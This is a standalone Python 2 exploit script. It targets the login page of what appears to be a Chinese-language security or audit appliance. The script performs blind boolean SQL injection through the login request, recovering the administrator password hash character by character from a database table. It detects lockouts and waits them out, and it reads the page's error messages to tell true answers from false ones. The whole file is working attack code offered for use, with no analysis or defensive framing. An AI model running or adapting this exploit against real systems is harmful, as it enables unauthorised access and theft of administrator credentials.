# encoding:utf-8
import requests
import sys
import time
if len(sys.argv)&lt;2 :
	print "useage: test.py target\r"
	print "example: python test.py https://192.168.222.128/"
	sys.exit(0)
target = sys.argv[1]
def exploit(url,pointer) :
	password = ""
	list = ["a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9"]
	while pointer &lt; 17 :
		flag = False
		index = 0
		while (index &lt; len(list)) :
			sql = "and (select mid(sys_adt_pass,%d,1) from sys_adt where id=1)=\"%s\"" % (pointer+1,list[index])
			response = requests.get(url+"src/login.php?action_c=login&amp;user_type=1&amp;user=admin&amp;pass=&amp;nodeid=1 "+sql,timeout=10,verify=False)
			if "拒绝登录" in response.content : #IP被封锁时，延迟305秒
				print "login failure exceeded 5 times,ip is banned,wait for 305 seconds to continue"
				time.sleep(305)
			elif "用户名或者密码不正确" in response.content :
				print "password[%d]=%s" % (pointer,list[index])
				password += list[index]
				break
			elif "连接数据库失败" in response.content :
				index += 1
			else :
				print "error,exit!"
				sys.exit(0)
				
		pointer += 1
	print("Admin's password is %s") % (password)
exploit(target,0)
print "done!"